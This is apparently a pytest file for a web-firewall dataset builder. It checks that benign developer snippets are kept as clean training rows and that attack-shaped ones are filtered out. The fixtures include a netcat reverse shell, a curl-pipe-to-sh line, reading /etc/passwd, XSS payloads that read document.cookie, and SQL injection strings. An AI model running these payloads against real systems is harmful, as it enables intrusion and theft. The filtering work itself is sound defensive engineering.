"""WAF v2 data round 3: short, complete, benign developer snippets (tldr, MDN, compose, SQL).

Why: the retrained models still blocked complete one-line shell commands, short HTML/JS, config files and
whole SQL statements, because the clean class held only multi-line system files. These loaders add real
short ones. Tests use tiny fixture trees in tmp_path: the real corpora are never read here.
"""
import json
import os
import random
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from dataset_tools.waf.v2 import benign_real, build  # noqa: E402


def _write(p, text):
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text)


def _texts(rows):
    return [r["text"] for r in rows]


# --- tldr-pages ---------------------------------------------------------------------------------
TLDR_PAGE = """# ls

> List directory contents.
> More information: <https://example.com/ls>.

- List files one per line:

`ls -1`

- List all files, including hidden files:

`ls {{[-a|--all]}}`

- Archive a directory:

`tar -czf {{path/to/archive.tar.gz}} {{path/to/directory}}`

- Reverse shell (attack tool example):

`nc -e /bin/sh 10.0.0.1 4444`

- Pipe a script into a shell:

`curl -s https://example.com/x.sh | sh`

- Show the password file:

`cat /etc/passwd`
"""


def test_tldr_commands_are_extracted_with_placeholders_filled(tmp_path):
    _write(tmp_path / "tldr" / "pages" / "common" / "ls.md", TLDR_PAGE)
    rows = benign_real.load_tldr(str(tmp_path), random.Random(1))
    got = _texts(rows)
    assert "ls -1" in got
    assert any(t.startswith("tar -czf path/to/archive.tar.gz path/to/directory") for t in got), got
    assert all("{{" not in t and "}}" not in t and "[" not in t.split(" ")[0] for t in got), \
        "template syntax must never survive: it looks like SSTI"
    assert any(t in ("ls -a", "ls --all") for t in got), got
    assert all(r["label"] == "clean" and r["source"] == "tldr:common" for r in rows)


def test_tldr_drops_attack_shaped_commands(tmp_path):
    _write(tmp_path / "tldr" / "pages" / "linux" / "x.md", TLDR_PAGE)
    got = _texts(benign_real.load_tldr(str(tmp_path), random.Random(1)))
    assert not any("nc -e" in t or "| sh" in t or "/etc/passwd" in t for t in got), got


def test_tldr_is_deterministic_capped_and_tolerates_missing(tmp_path):
    for i in range(30):
        _write(tmp_path / "tldr" / "pages" / "common" / f"c{i}.md", f"# c{i}\n\n- Do it:\n\n`c{i} --flag {{{{path/to/file}}}}`\n")
    a = benign_real.load_tldr(str(tmp_path), random.Random(5), n_max=7)
    b = benign_real.load_tldr(str(tmp_path), random.Random(5), n_max=7)
    assert a == b and len(a) == 7
    assert benign_real.load_tldr(str(tmp_path / "nope"), random.Random(1)) == []


def test_tldr_applies_denylist_and_secret_filter(tmp_path):
    _write(tmp_path / "tldr" / "pages" / "common" / "d.md",
           "# d\n\n- a:\n\n`ssh acmecorp-host`\n\n- b:\n\n`login --password=hunter2secret`\n\n- c:\n\n`ls -la`\n")
    got = _texts(benign_real.load_tldr(str(tmp_path), random.Random(1), denylist=("acmecorp",)))
    assert got == ["ls -la"]


# --- MDN interactive examples -----------------------------------------------------------------------
def test_mdn_short_html_css_js_examples_are_kept_and_handlers_dropped(tmp_path):
    base = tmp_path / "mdn_examples" / "live-examples"
    _write(base / "html-examples" / "text-content" / "p.html", "<p>Hello <b>world</b></p>\n<br>\n")
    _write(base / "css-examples" / "box" / "margin.css", "p {\n  margin: 1em 0;\n}\n")
    _write(base / "js-examples" / "array" / "array-map.js", "const a = [1, 2, 3];\nconsole.log(a.map((x) => x * 2));\n")
    _write(base / "html-examples" / "bad" / "x.html", '<img src="x" onerror="alert(1)">')
    _write(base / "js-examples" / "bad" / "y.js", "alert(document.cookie);\n")
    _write(base / "html-examples" / "bad" / "z.html", "<script>run()</script>")
    rows = benign_real.load_mdn_examples(str(tmp_path), random.Random(1))
    got = _texts(rows)
    assert "<p>Hello <b>world</b></p>\n<br>" in got or "<p>Hello <b>world</b></p>" in got
    assert "<br>" in got, "single-line fragments are the point"
    assert any("margin: 1em 0" in t for t in got) and any("a.map" in t for t in got)
    assert not any("onerror" in t or "alert(" in t or "<script" in t.lower() for t in got), got
    assert {r["source"].split(":")[0] for r in rows} == {"mdn"}
    assert all(r["label"] == "clean" and 3 <= len(r["text"]) <= 600 for r in rows)


def test_mdn_is_deterministic_and_tolerates_missing(tmp_path):
    base = tmp_path / "mdn_examples" / "live-examples" / "html-examples"
    for i in range(20):
        _write(base / "s" / f"e{i}.html", f"<div class=\"c{i}\">item {i}</div>\n")
    a = benign_real.load_mdn_examples(str(tmp_path), random.Random(3), n_max=5)
    assert a == benign_real.load_mdn_examples(str(tmp_path), random.Random(3), n_max=5) and len(a) == 5
    assert benign_real.load_mdn_examples(str(tmp_path / "nope"), random.Random(1)) == []


# --- awesome-compose ---------------------------------------------------------------------------------
def test_compose_files_are_kept_and_secret_bearing_ones_dropped(tmp_path):
    base = tmp_path / "awesome_compose"
    _write(base / "web" / "compose.yaml", "services:\n  web:\n    image: nginx:1.25\n    ports:\n      - \"8080:80\"\n")
    _write(base / "db" / "docker-compose.yml", "services:\n  db:\n    image: mysql\n    environment:\n      MYSQL_ROOT_PASSWORD: example1234\n")
    _write(base / "corp" / "compose.yaml", "services:\n  app:\n    image: acmecorp/app:1\n")
    rows = benign_real.load_awesome_compose(str(tmp_path), random.Random(1), denylist=("acmecorp",))
    got = "\n".join(_texts(rows))
    assert "nginx:1.25" in got
    assert "example1234" not in got and "acmecorp" not in got
    assert all(r["label"] == "clean" and r["source"] == "compose:yaml" and len(r["text"]) <= 600 for r in rows)


def test_compose_tolerates_missing(tmp_path):
    assert benign_real.load_awesome_compose(str(tmp_path / "nope"), random.Random(1)) == []


# --- sql-create-context --------------------------------------------------------------------------------
def _sql_json(tmp_path, items):
    p = tmp_path / "sql_create_context" / "sql_create_context_v4.json"
    _write(p, json.dumps([{"question": "q", "context": c, "answer": a} for c, a in items]))


def test_sql_statements_are_extracted_and_attack_shaped_ones_dropped(tmp_path):
    _sql_json(tmp_path, [
        ("CREATE TABLE head (name VARCHAR, age INTEGER)", "SELECT name FROM head WHERE age > 56 ORDER BY name"),
        ("CREATE TABLE t (a INTEGER)", "SELECT a FROM t WHERE a = 1 OR 1 = 1"),
        ("CREATE TABLE u (a INTEGER)", "SELECT a FROM u UNION SELECT password FROM users"),
        ("CREATE TABLE v (a INTEGER)", "SELECT a FROM v -- comment"),
        ("CREATE TABLE w (a INTEGER)", "SELECT a FROM w; DROP TABLE w"),
    ])
    rows = benign_real.load_sql_create_context(str(tmp_path), random.Random(1))
    got = _texts(rows)
    base = [t.rstrip(";") for t in got]
    assert "SELECT name FROM head WHERE age > 56 ORDER BY name" in base
    assert "CREATE TABLE head (name VARCHAR, age INTEGER)" in base
    assert not any("1 = 1" in t or "UNION" in t or "--" in t or "DROP" in t for t in got), got
    assert {r["source"] for r in rows} <= {"sqlctx:select", "sqlctx:create"}
    assert all(r["label"] == "clean" for r in rows)


def test_sql_is_deterministic_capped_and_tolerates_missing_or_broken(tmp_path):
    _sql_json(tmp_path, [(f"CREATE TABLE t{i} (a INTEGER)", f"SELECT a FROM t{i} WHERE a > {i}") for i in range(50)])
    a = benign_real.load_sql_create_context(str(tmp_path), random.Random(2), n_max=10)
    assert a == benign_real.load_sql_create_context(str(tmp_path), random.Random(2), n_max=10) and len(a) <= 10
    assert benign_real.load_sql_create_context(str(tmp_path / "nope"), random.Random(1)) == []
    _write(tmp_path / "sql_create_context" / "sql_create_context_v4.json", "[not json")
    assert benign_real.load_sql_create_context(str(tmp_path), random.Random(1)) == []


# --- build integration ----------------------------------------------------------------------------------
def test_build_includes_the_new_snippets_as_clean_rows_in_every_carrier(tmp_path):
    src = tmp_path / "s"
    (src / "patt" / "SQL Injection" / "Intruder").mkdir(parents=True)
    (src / "patt" / "SQL Injection" / "Intruder" / "a.txt").write_text("\n".join(f"' OR {i}={i}--" for i in range(300)))
    for i in range(40):
        _write(src / "tldr" / "pages" / "common" / f"t{i}.md", f"# t{i}\n\n- x:\n\n`tool{i} --verbose {{{{path/to/file}}}}`\n")
        _write(src / "mdn_examples" / "live-examples" / "html-examples" / "g" / f"h{i}.html", f"<p>para {i}</p>\n")
    _sql_json(src, [(f"CREATE TABLE t{i} (a INTEGER)", f"SELECT a FROM t{i} WHERE a > {i}") for i in range(40)])
    out = tmp_path / "o"
    rep = build.build(str(src), str(out), seed=4, n_clean=300, include_local_pools=False)
    rows = [json.loads(x) for x in open(out / "train.jsonl")]
    mine = [r for r in rows if r["source"].split(":")[0] in ("tldr", "mdn", "sqlctx")]
    assert mine and all(r["label"] == "clean" for r in mine)
    assert len({r["shape"] for r in mine}) > 3, "snippets must appear bare AND inside form/json/url carriers"
    assert {"tldr", "mdn", "sqlctx"} <= set(rep["sources"])


# --- breaker round: defects found by running the loaders on the real corpora ---------------------------
from ml.waf import gate as _gate, signatures as _signatures  # noqa: E402


def test_tldr_drops_embedded_credentials_and_command_substitution_and_strong_markers(tmp_path):
    cmds = ["7zr a out.7z -ppassword -mhe=on in.7z", "wget2 --user bob --password hunter22 https://example.com",
            'rsql --url "postgresql://user:pass@localhost/db"', 'grim -g "$(slurp -w 0)"',
            'echo "input" >&"${name_1}"', "sudo unshare -puinmf chroot new_root /bin/sh", "ls -la"]
    body = "# d\n\n" + "".join(f"- x:\n\n`{c}`\n\n" for c in cmds)
    _write(tmp_path / "tldr" / "pages" / "common" / "d.md", body)
    got = _texts(benign_real.load_tldr(str(tmp_path), random.Random(1)))
    assert got == ["ls -la"], got


def test_mdn_drops_template_syntax_traversal_and_strong_markers(tmp_path):
    base = tmp_path / "mdn_examples" / "live-examples"
    _write(base / "js-examples" / "a.js", "const url = '{%wasm-url%}';\nconsole.log(url);\n")
    _write(base / "js-examples" / "b.js", "const n = 3;\nconsole.log(`n is ${n}`);\n")
    _write(base / "css-examples" / "c.css", "@font-face {\n  src: url('../../../media/f.woff2');\n}\n")
    _write(base / "html-examples" / "d.html", '<div data-x="orphans"> <p>hi</p></div>')
    _write(base / "js-examples" / "e.js", "const u = new URL('https://admin:test@example.com/x');\n")
    _write(base / "js-examples" / "ok.js", "const a = 1;\nconsole.log(a);\n")
    got = _texts(benign_real.load_mdn_examples(str(tmp_path), random.Random(1)))
    assert got == ["const a = 1;\nconsole.log(a);"], got


def test_compose_drops_shell_entrypoints(tmp_path):
    base = tmp_path / "awesome_compose"
    _write(base / "a" / "compose.yaml", 'services:\n  a:\n    image: nginx\n    command: /bin/bash -c "envsubst < /t > /o"\n')
    _write(base / "b" / "compose.yaml", "services:\n  b:\n    image: nginx:1\n")
    got = "\n".join(_texts(benign_real.load_awesome_compose(str(tmp_path), random.Random(1))))
    assert "/bin/bash" not in got and "nginx:1" in got


def test_sql_drops_tautology_shaped_conjunctions(tmp_path):
    _sql_json(tmp_path, [
        ("CREATE TABLE t (a INTEGER, b TEXT)", 'SELECT a FROM t WHERE b = "x" AND a = "2"'),
        ("CREATE TABLE u (a INTEGER)", "SELECT 1953 FROM u WHERE 1947 = 2 AND 1938 = 3"),
        ("CREATE TABLE v (a INTEGER)", "SELECT a FROM v WHERE a > 5"),
    ])
    got = [t.rstrip(";") for t in _texts(benign_real.load_sql_create_context(str(tmp_path), random.Random(1)))]
    assert "SELECT a FROM v WHERE a > 5" in got
    assert not any(" AND " in t for t in got), got


def test_no_loader_row_trips_a_strong_marker_or_signature(tmp_path):
    base = tmp_path / "mdn_examples" / "live-examples"
    _write(base / "html-examples" / "f.html", '<form><input name="origin"><p>x</p></form>')
    _write(base / "js-examples" / "g.js", "const o = {};\ndelete o.p;\nconsole.log(o);\n")
    _write(base / "js-examples" / "h.js", "console.log(1 + 1);\n")
    rows = benign_real.load_mdn_examples(str(tmp_path), random.Random(1))
    assert _texts(rows) == ["console.log(1 + 1);"]
    for r in rows:
        assert not _gate.has_strong_marker(r["text"]) and not _signatures.signature_hits(r["text"]), r
